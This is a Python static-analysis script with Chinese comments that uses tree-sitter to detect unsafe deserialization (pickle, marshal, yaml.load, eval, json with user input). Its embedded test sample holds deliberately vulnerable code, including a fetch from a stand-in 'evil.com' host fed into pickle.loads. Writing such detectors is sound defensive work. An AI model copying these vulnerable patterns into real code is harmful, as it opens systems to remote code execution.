import os
import re
import json
from tree_sitter import Language, Parser

# 假设已经配置了Python语言路径
from .config_path import language_path

# 加载Python语言
LANGUAGES = {
    'python': Language(language_path, 'python'),
}

# 定义不安全的JSON反序列化漏洞模式
UNSAFE_JSON_DESERIALIZATION_VULNERABILITIES = {
    'python': [
        # 检测json.loads直接调用
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(json|simplejson|ujson|rapidjson)$',
            'func_pattern': r'^(loads|load)$',
            'message': 'JSON反序列化函数调用'
        },
        # 检测直接导入的json函数
        {
            'query': '''
                (call
                    function: (identifier) @func_name
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'func_pattern': r'^(loads|load)$',
            'message': '直接JSON反序列化函数调用'
        },
        # 检测pickle模块的不安全反序列化
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(pickle|cPickle|dill|shelve)$',
            'func_pattern': r'^(loads|load)$',
            'message': 'Pickle反序列化函数调用',
            'severity': '严重'
        },
        # 检测yaml不安全加载
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^(yaml|PyYAML)$',
            'func_pattern': r'^(load|load_all|safe_load|safe_load_all)$',
            'message': 'YAML反序列化函数调用',
            'check_unsafe': True
        },
        # 检测marshal模块
        {
            'query': '''
                (call
                    function: (attribute
                        object: (identifier) @module
                        attribute: (identifier) @func_name
                    )
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'module_pattern': r'^marshal$',
            'func_pattern': r'^(loads|load)$',
            'message': 'Marshal反序列化函数调用',
            'severity': '严重'
        },
        # 检测eval风格的JSON解析
        {
            'query': '''
                (call
                    function: (identifier) @func_name
                    arguments: (argument_list (_) @arg)
                ) @call
            ''',
            'func_pattern': r'^(eval)$',
            'message': 'eval函数用于JSON解析',
            'severity': '严重'
        }
    ]
}

# 用户输入源模式（复用之前的定义，稍作扩展）
USER_INPUT_SOURCES = {
    'query': '''
        [
            (call
                function: (identifier) @func_name
                arguments: (argument_list) @args
            )
            (call
                function: (attribute
                    object: (_) @obj
                    attribute: (identifier) @attr
                )
                arguments: (argument_list) @args
            )
        ] @call
    ''',
    'patterns': [
        {
            'func_pattern': r'^(input|raw_input)$',
            'message': '标准输入函数'
        },
        {
            'obj_pattern': r'^(sys\.stdin|stdin)$',
            'attr_pattern': r'^(read|readline|readlines)$',
            'message': '标准输入读取'
        },
        {
            'func_pattern': r'^(getenv)$',
            'message': '环境变量获取'
        },
        {
            'obj_pattern': r'^(sys)$',
            'attr_pattern': r'^(argv)$',
            'message': '命令行参数'
        },
        {
            'obj_pattern': r'^os\.environ$',
            'attr_pattern': r'^(get|__getitem__)$',
            'message': '环境变量获取'
        },
        {
            'obj_pattern': r'^(requests|urllib|urllib2|http\.client)$',
            'attr_pattern': r'^(get|post|put|delete|request|urlopen)$',
            'message': '网络输入'
        },
        {
            'obj_pattern': r'^(flask|django|bottle|tornado)\.request$',
            'attr_pattern': r'^(args|form|values|data|json|files|headers|cookies|get|post)$',
            'message': 'Web框架输入'
        },
        {
            'obj_pattern': r'^(socket)$',
            'attr_pattern': r'^(recv|recvfrom|recvmsg)$',
            'message': '网络套接字输入'
        }
    ]
}

# 对象钩子和自定义解析器检测
CUSTOM_DESERIALIZATION_PATTERNS = {
    'query': '''
        [
            (call
                function: (attribute
                    object: (identifier) @module
                    attribute: (identifier) @func_name
                )
                arguments: (argument_list 
                    (_)* @args
                    (keyword_argument
                        name: (identifier) @kw_name
                        value: (_) @kw_value
                    ) @kw_arg
                )
            ) @call
            (call
                function: (identifier) @func_name
                arguments: (argument_list 
                    (_)* @args
                    (keyword_argument
                        name: (identifier) @kw_name
                        value: (_) @kw_value
                    ) @kw_arg
                )
            ) @call
        ]
    ''',
    'patterns': [
        {
            'module_pattern': r'^(json|simplejson|ujson)$',
            'func_pattern': r'^(loads|load)$',
            'keyword_pattern': r'^(object_hook|object_pairs_hook|parse_float|parse_int|parse_constant)$',
            'message': '自定义JSON解析钩子'
        },
        {
            'module_pattern': r'^yaml$',
            'func_pattern': r'^(load|load_all)$',
            'keyword_pattern': r'^(Loader)$',
            'message': 'YAML自定义加载器'
        }
    ]
}

# 安全函数模式
SAFE_DESERIALIZATION_PATTERNS = {
    'python': [
        {
            'module_pattern': r'^yaml$',
            'func_pattern': r'^(safe_load|safe_load_all)$',
            'message': '安全的YAML加载'
        },
        {
            'module_pattern': r'^json$',
            'func_pattern': r'^(loads|load)$',
            'message': 'JSON加载'
        }
    ]
}


def detect_unsafe_deserialization(code, language='python'):
    """
    检测Python代码中不安全的反序列化漏洞

    Args:
        code: Python源代码字符串
        language: 语言类型，默认为'python'

    Returns:
        list: 检测结果列表
    """
    if language not in LANGUAGES:
        return []

    # 初始化解析器
    parser = Parser()
    parser.set_language(LANGUAGES[language])

    # 解析代码
    tree = parser.parse(bytes(code, 'utf8'))
    root = tree.root_node

    vulnerabilities = []
    deserialization_calls = []  # 存储所有反序列化调用
    user_input_sources = []  # 存储用户输入源
    custom_parsers = []  # 存储自定义解析器
    safe_calls = []  # 存储安全调用

    # 第一步：收集所有反序列化调用
    for query_info in UNSAFE_JSON_DESERIALIZATION_VULNERABILITIES[language]:
        try:
            query = LANGUAGES[language].query(query_info['query'])
            captures = query.captures(root)

            current_capture = {}
            for node, tag in captures:
                if tag in ['func_name', 'module']:
                    name = node.text.decode('utf8')
                    current_capture[tag] = name
                    current_capture['node'] = node.parent
                    current_capture['line'] = node.start_point[0] + 1

                elif tag in ['arg', 'kw_arg']:
                    current_capture[tag] = node.text.decode('utf8')
                    current_capture[f'{tag}_node'] = node

                elif tag == 'call' and current_capture:
                    # 检查模块和函数名是否匹配模式
                    module_pattern = query_info.get('module_pattern', '')
                    func_pattern = query_info.get('func_pattern', '')

                    module_match = True
                    func_match = True

                    if module_pattern and 'module' in current_capture:
                        module_match = re.match(module_pattern, current_capture['module'], re.IGNORECASE)

                    if func_pattern and 'func_name' in current_capture:
                        func_match = re.match(func_pattern, current_capture['func_name'], re.IGNORECASE)

                    if module_match and func_match:
                        code_snippet = node.text.decode('utf8')

                        deserialization_calls.append({
                            'type': 'deserialization_call',
                            'line': current_capture['line'],
                            'module': current_capture.get('module', ''),
                            'function': current_capture.get('func_name', ''),
                            'argument': current_capture.get('arg', ''),
                            'arg_node': current_capture.get('arg_node'),
                            'code_snippet': code_snippet,
                            'node': node,
                            'severity': query_info.get('severity', '高危'),
                            'check_unsafe': query_info.get('check_unsafe', False),
                            'original_message': query_info.get('message', '')
                        })
                    current_capture = {}

        except Exception as e:
            print(f"查询错误 {query_info.get('message')}: {e}")
            continue

    # 第二步：收集用户输入源
    try:
        query = LANGUAGES[language].query(USER_INPUT_SOURCES['query'])
        captures = query.captures(root)

        current_capture = {}
        for node, tag in captures:
            if tag in ['func_name', 'obj', 'attr']:
                name = node.text.decode('utf8')
                current_capture[tag] = name
                current_capture['node'] = node.parent
                current_capture['line'] = node.start_point[0] + 1

            elif tag == 'call' and current_capture:
                for pattern_info in USER_INPUT_SOURCES['patterns']:
                    func_pattern = pattern_info.get('func_pattern', '')
                    obj_pattern = pattern_info.get('obj_pattern', '')
                    attr_pattern = pattern_info.get('attr_pattern', '')

                    match = False
                    if func_pattern and 'func_name' in current_capture:
                        if re.match(func_pattern, current_capture['func_name'], re.IGNORECASE):
                            match = True
                    elif obj_pattern and attr_pattern and 'obj' in current_capture and 'attr' in current_capture:
                        if (re.match(obj_pattern, current_capture['obj'], re.IGNORECASE) and
                                re.match(attr_pattern, current_capture['attr'], re.IGNORECASE)):
                            match = True

                    if match:
                        code_snippet = node.text.decode('utf8')
                        user_input_sources.append({
                            'type': 'user_input',
                            'line': current_capture['line'],
                            'function': current_capture.get('func_name', ''),
                            'object': current_capture.get('obj', ''),
                            'attribute': current_capture.get('attr', ''),
                            'code_snippet': code_snippet,
                            'node': node
                        })
                        break

                current_capture = {}

    except Exception as e:
        print(f"用户输入源查询错误: {e}")

    # 第三步：收集自定义解析器
    try:
        query = LANGUAGES[language].query(CUSTOM_DESERIALIZATION_PATTERNS['query'])
        captures = query.captures(root)

        current_capture = {}
        for node, tag in captures:
            if tag in ['func_name', 'module', 'kw_name']:
                current_capture[tag] = node.text.decode('utf8')
                current_capture['node'] = node.parent
                current_capture['line'] = node.start_point[0] + 1

            elif tag == 'call' and current_capture:
                for pattern_info in CUSTOM_DESERIALIZATION_PATTERNS['patterns']:
                    module_pattern = pattern_info.get('module_pattern', '')
                    func_pattern = pattern_info.get('func_pattern', '')
                    keyword_pattern = pattern_info.get('keyword_pattern', '')

                    if ('module' in current_capture and 'func_name' in current_capture and
                            'kw_name' in current_capture):

                        module_match = re.match(module_pattern, current_capture['module'],
                                                re.IGNORECASE) if module_pattern else True
                        func_match = re.match(func_pattern, current_capture['func_name'],
                                              re.IGNORECASE) if func_pattern else True
                        kw_match = re.match(keyword_pattern, current_capture['kw_name'],
                                            re.IGNORECASE) if keyword_pattern else True

                        if module_match and func_match and kw_match:
                            code_snippet = node.text.decode('utf8')
                            custom_parsers.append({
                                'line': current_capture['line'],
                                'module': current_capture['module'],
                                'function': current_capture['func_name'],
                                'keyword': current_capture['kw_name'],
                                'code_snippet': code_snippet,
                                'node': node,
                                'message': pattern_info.get('message', '')
                            })
                current_capture = {}

    except Exception as e:
        print(f"自定义解析器查询错误: {e}")

    # 第四步：识别安全调用
    for call in deserialization_calls:
        # 检查是否是安全调用
        if is_safe_deserialization(call):
            safe_calls.append(call)
            continue

    # 第五步：分析漏洞
    for call in deserialization_calls:
        # 跳过安全调用
        if call in safe_calls:
            continue

        is_vulnerable = False
        vulnerability_details = {
            'line': call['line'],
            'code_snippet': call['code_snippet'],
            'vulnerability_type': '不安全的反序列化',
            'severity': call['severity'],
            'module': call['module'],
            'function': call['function']
        }

        # 情况1: pickle/marshal等危险模块
        if call['module'] in ['pickle', 'cPickle', 'marshal', 'dill']:
            vulnerability_details['message'] = f"危险的反序列化模块: {call['module']}.{call['function']}"
            is_vulnerable = True

        # 情况2: yaml不安全加载
        elif call['module'] in ['yaml', 'PyYAML'] and call['function'] in ['load', 'load_all']:
            vulnerability_details['message'] = f"不安全的YAML加载: {call['module']}.{call['function']}"
            is_vulnerable = True

        # 情况3: eval用于JSON解析
        elif call['function'] == 'eval':
            vulnerability_details['message'] = "使用eval进行JSON解析"
            vulnerability_details['severity'] = '严重'
            is_vulnerable = True

        # 情况4: 参数来自用户输入
        elif call['arg_node'] and is_user_input_related(call['arg_node'], user_input_sources, root):
            vulnerability_details['message'] = f"用户输入直接传递给反序列化函数: {call['module']}.{call['function']}"
            is_vulnerable = True

        # 情况5: 自定义解析器可能引入风险
        elif has_custom_parser(call, custom_parsers):
            vulnerability_details['message'] = f"使用自定义解析器可能引入安全风险: {call['module']}.{call['function']}"
            is_vulnerable = True

        # 情况6: JSON加载但需要进一步检查上下文
        elif call['module'] in ['json', 'simplejson'] and not is_clearly_safe(call, safe_calls):
            vulnerability_details['message'] = f"JSON反序列化调用需要安全检查: {call['module']}.{call['function']}"
            vulnerability_details['severity'] = '中危'
            is_vulnerable = True

        if is_vulnerable:
            vulnerabilities.append(vulnerability_details)

    return sorted(vulnerabilities, key=lambda x: x['line'])


def is_safe_deserialization(call):
    """
    检查是否是安全的反序列化调用
    """
    # yaml.safe_load 是安全的
    if call['module'] in ['yaml', 'PyYAML'] and call['function'] in ['safe_load', 'safe_load_all']:
        return True

    # 其他情况需要根据上下文判断
    return False


def is_user_input_related(arg_node, user_input_sources, root_node):
    """
    检查参数节点是否与用户输入相关
    """
    arg_text = arg_node.text.decode('utf8')

    # 检查常见的用户输入变量名
    user_input_vars = ['input', 'user_input', 'data', 'json_str', 'request',
                       'response', 'body', 'content', 'payload', 'param']
    for var in user_input_vars:
        if re.search(rf'\b{var}\b', arg_text, re.IGNORECASE):
            return True

    # 检查是否匹配已知的用户输入源
    for source in user_input_sources:
        if source['node'] == arg_node or is_child_node(arg_node, source['node']):
            return True

    return False


def has_custom_parser(call, custom_parsers):
    """
    检查是否有自定义解析器
    """
    for parser in custom_parsers:
        if (parser['module'] == call['module'] and
                parser['function'] == call['function'] and
                parser['line'] == call['line']):
            return True
    return False


def is_clearly_safe(call, safe_calls):
    """
    检查JSON调用是否明显安全
    """
    # 检查是否是硬编码的JSON字符串
    arg_text = call.get('argument', '')
    safe_patterns = [
        r'^\s*\{[^{}]*\}\s*$',  # 简单的JSON对象
        r'^\s*\[[^\[\]]*\]\s*$',  # 简单的JSON数组
        r'^\s*"[^"]*"\s*$',  # 简单的字符串
    ]

    for pattern in safe_patterns:
        if re.match(pattern, arg_text):
            return True

    return False


def is_child_node(child, parent):
    """
    检查一个节点是否是另一个节点的子节点
    """
    node = child
    while node:
        if node == parent:
            return True
        node = node.parent
    return False


def analyze_python_deserialization(code_string):
    """
    分析Python代码字符串中的不安全反序列化漏洞
    """
    return detect_unsafe_deserialization(code_string, 'python')


# 示例使用
if __name__ == "__main__":
    # 测试Python代码
    test_python_code = """
import json
import pickle
import yaml
import marshal
import requests
from flask import request

def vulnerable_deserialization():
    # 1. 直接反序列化用户输入 - 高危
    user_input = input("Enter JSON: ")
    data = json.loads(user_input)  # 危险

    # 2. pickle反序列化 - 严重
    pickled_data = requests.get("http://evil.com/data.pickle").content
    obj = pickle.loads(pickled_data)  # 严重漏洞

    # 3. yaml不安全加载
    yaml_data = request.files['config'].read()
    config = yaml.load(yaml_data)  # 危险

    # 4. marshal反序列化
    serialized_obj = b'...'
    obj = marshal.loads(serialized_obj)  # 严重漏洞

    # 5. Web输入直接反序列化
    json_data = request.get_json()
    if json_data:
        data = json.loads(json_data)  # 危险

    # 6. 自定义对象钩子可能引入风险
    def custom_object_hook(dct):
        return dct

    user_json = request.args.get('data')
    data = json.loads(user_json, object_hook=custom_object_hook)  # 需要检查

    # 7. eval用于JSON解析
    json_str = '{"key": "value"}'
    data = eval(json_str)  # 严重漏洞

def safe_deserialization():
    # 1. 硬编码JSON - 相对安全
    data = json.loads('{"name": "test", "value": 123}')

    # 2. 安全的YAML加载
    config = yaml.safe_load('key: value')

    # 3. 来自可信源的JSON
    trusted_data = get_trusted_json()
    data = json.loads(trusted_data)

    # 4. 带有适当验证的反序列化
    user_input = input("Enter JSON: ")
    if is_safe_json(user_input):
        data = json.loads(user_input)

def is_safe_json(json_str):
    '''简单的JSON安全检查'''
    try:
        data = json.loads(json_str)
        # 检查数据结构和内容
        if isinstance(data, dict) and all(isinstance(k, str) for k in data.keys()):
            return True
    except:
        pass
    return False

def get_trusted_json():
    return '{"trusted": "data"}'

if __name__ == "__main__":
    vulnerable_deserialization()
    safe_deserialization()
"""

    print("=" * 60)
    print("Python不安全反序列化漏洞检测")
    print("=" * 60)

    results = analyze_python_deserialization(test_python_code)

    if results:
        print(f"检测到 {len(results)} 个潜在漏洞:")
        for i, vuln in enumerate(results, 1):
            print(f"\n{i}. 行号 {vuln['line']}: {vuln['message']}")
            print(f"   代码片段: {vuln['code_snippet'][:100]}...")
            print(f"   漏洞类型: {vuln['vulnerability_type']}")
            print(f"   严重程度: {vuln['severity']}")
            print(f"   函数调用: {vuln.get('module', '')}.{vuln.get('function', '')}")
    else:
        print("未检测到不安全反序列化漏洞")